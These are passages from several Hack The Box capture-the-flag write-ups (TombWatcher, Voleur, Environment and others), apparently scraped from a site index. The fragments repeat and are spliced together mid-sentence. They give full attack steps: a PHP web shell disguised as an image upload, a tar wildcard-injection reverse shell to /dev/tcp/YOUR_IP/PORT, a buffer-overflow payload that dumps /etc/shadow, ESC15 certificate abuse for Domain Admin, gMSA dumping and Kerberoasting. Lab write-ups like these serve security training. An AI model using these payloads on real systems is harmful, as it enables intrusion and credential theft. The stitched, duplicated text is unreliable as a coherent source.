See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV 